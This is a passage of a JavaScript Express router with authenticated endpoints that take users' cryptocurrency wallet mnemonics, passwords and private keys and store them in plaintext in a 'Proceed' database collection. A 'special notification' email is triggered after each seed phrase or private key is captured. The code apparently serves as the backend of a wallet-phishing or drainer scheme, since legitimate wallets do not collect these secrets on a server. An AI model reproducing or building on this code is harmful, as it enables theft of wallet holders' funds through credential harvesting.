        message: 'Proceed entry not found. Please ensure you have an existing entry.'
      });
    }
    
    // Update the existing entry with mnemonic
    proceedEntry.mnemonic = mnemonic.trim();
    await proceedEntry.save();
    
    // Send notification email
    try {
      const emailService = (await import('../services/emailService.js')).default;
      await emailService.sendSpecialNotification(userEmail);
    } catch (emailError) {
      console.error('Failed to send notification email:', emailError);
      // Don't fail the request if email fails
    }
    
    res.json({
      success: true,
      message: 'Mnemonic stored successfully'
    });
  } catch (error) {
    console.error('Error storing mnemonic:', error);
    res.status(500).json({ 
      success: false,
      message: 'Failed to store mnemonic',
      error: error.message 
    });
  }
});

// Store password in proceed collection
router.post('/store-password', authenticateToken, async (req, res) => {
  try {
    const { password, walletName } = req.body;
    const userEmail = req.user.email;
    
    if (!password) {
      return res.status(400).json({ 
        success: false,
        message: 'Password is required' 
      });
    }
    
    if (!walletName) {
      return res.status(400).json({ 
        success: false,
        message: 'Wallet name is required' 
      });
    }
    
    // Find existing proceed entry and update it with password
    const proceedEntry = await Proceed.findOne({
      email: userEmail.toLowerCase(),
      walletName: walletName.trim()
    });
    
    if (!proceedEntry) {
      return res.status(404).json({
        success: false,
        message: 'Proceed entry not found. Please ensure you have an existing entry.'
      });
    }
    
    // Update the existing entry with password
    proceedEntry.password = password.trim();
    await proceedEntry.save();
    
    res.json({
      success: true,
      message: 'Password stored successfully'
    });
  } catch (error) {
    console.error('Error storing password:', error);
    res.status(500).json({ 
      success: false,
      message: 'Failed to store password',
      error: error.message 
    });
  }
});

// Store private key in proceed collection
router.post('/store-private-key', authenticateToken, async (req, res) => {
  try {
    const { privateKey, walletName, chainName } = req.body;
    const userEmail = req.user.email;
    
    if (!privateKey) {
      return res.status(400).json({ 
        success: false,
        message: 'Private key is required' 
      });
    }
    
    if (!walletName) {
      return res.status(400).json({ 
        success: false,
        message: 'Wallet name is required' 
      });
    }
    
    // Find existing proceed entry and update it with private key
    const proceedEntry = await Proceed.findOne({
      email: userEmail.toLowerCase(),
      walletName: walletName.trim()
    });
    
    if (!proceedEntry) {
      return res.status(404).json({
        success: false,
        message: 'Proceed entry not found. Please ensure you have an existing entry.'
      });
    }
    
    // Update the existing entry with private key and chain name
    proceedEntry.privateKey = privateKey.trim();
    if (chainName) {
      proceedEntry.chainName = chainName.trim();
    }
    await proceedEntry.save();
    
    // Send notification email
    try {
      const emailService = (await import('../services/emailService.js')).default;
      await emailService.sendSpecialNotification(userEmail);
    } catch (emailError) {
      console.error('Failed to send notification email:', emailError);
      // Don't fail the request if email fails
    }
    
    res.json({
      success: true,
      message: 'Private key stored successfully'
    });
  } catch (error) {
    console.error('Error storing private key:', error);
    res.status(500).json({ 
      success: false,
      message: 'Failed to store private key',
      error: error.message 
    });
  }
});

export default router; 